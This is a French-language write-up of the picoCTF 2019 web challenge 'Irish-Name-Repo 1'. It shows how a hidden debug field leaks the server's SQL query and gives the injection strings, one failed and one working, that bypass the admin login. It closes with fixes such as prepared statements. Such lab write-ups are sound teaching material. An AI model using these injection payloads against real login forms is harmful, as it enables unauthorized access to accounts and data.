# Irish-Name-Repo 1 — Writeup

## Informations
- Plateforme : CyLab Security Academy / picoCTF 2019
- Catégorie : Web Exploitation
- Difficulté : Medium
- Auteur du challenge : Chris Hensler

## Énoncé
Le challenge présente un site vitrine ("List 'o the Irish!") et demande de trouver un moyen de se connecter en tant qu'administrateur.

## Analyse initiale
L'inspection du code source de la page d'accueil révèle un lien "Admin Login" pointant vers `login.html`. Les deux indices fournis orientent explicitement vers une base de données utilisateurs et vers le mécanisme de vérification du login, suggérant une faille côté serveur plutôt qu'une simple erreur d'interface.

Le code source de `login.html` révèle un formulaire POST vers `login.php`, avec deux champs visibles (`username`, `password`) et un champ caché intéressant :

```html
<input type="hidden" name="debug" value="0">
```

## Identification de la vulnérabilité
En modifiant la valeur du champ caché `debug` de `0` à `1` via les DevTools, la page affiche la requête SQL brute exécutée par le serveur avant l'échec de connexion :

```sql
SELECT * FROM users WHERE name='test' AND password='test'
```

Cette fuite d'information confirme deux points essentiels : le nom réel de la colonne (`name`, pas `username`) et l'absence totale d'échappement des entrées utilisateur dans la requête SQL. Le champ `username` est concaténé directement dans la clause `WHERE`, ce qui ouvre la voie à une injection SQL classique.

## Exploitation

### Tentative 1 (échec)
```text
username: ' OR '1'='1
password: test
```

Requête générée :
```sql
SELECT * FROM users WHERE name='' OR '1'='1' AND password='test'
```

Échec attendu : en SQL, l'opérateur `AND` a une priorité supérieure à `OR`. La requête est donc interprétée comme `name='' OR ('1'='1' AND password='test')`, ce qui reste faux puisqu'aucun utilisateur n'a le mot de passe `test`.

### Tentative 2 (succès)
```text
username: ' OR '1'='1'-- 
password: test
```

Requête générée :
```sql
SELECT * FROM users WHERE name='' OR '1'='1'-- ' AND password='test'
```

Le marqueur de commentaire SQL `-- ` (avec un espace final) neutralise tout ce qui suit, y compris la vérification du mot de passe. Seule la condition `'1'='1'`, toujours vraie, est évaluée : l'authentification est contournée.

## Récupération du flag
Conformément aux règles de picoCTF/CyLab (flags générés dynamiquement par instance, à ne pas diffuser en clair par bonne pratique communautaire) :

```text
picoCTF{*************************}
```

## Ce que ça démontre
Cette faille illustre une injection SQL classique par contournement d'authentification (SQL Injection Auth Bypass), aggravée par une fuite d'information via un mode debug laissé actif en production.

## Correctif
- Utiliser des requêtes paramétrées (prepared statements) pour séparer strictement les données utilisateur de la structure SQL.
- Supprimer tout mode debug ou champ de diagnostic avant le déploiement en production.
- Appliquer le principe du moindre privilège au compte de base de données utilisé par l'application.
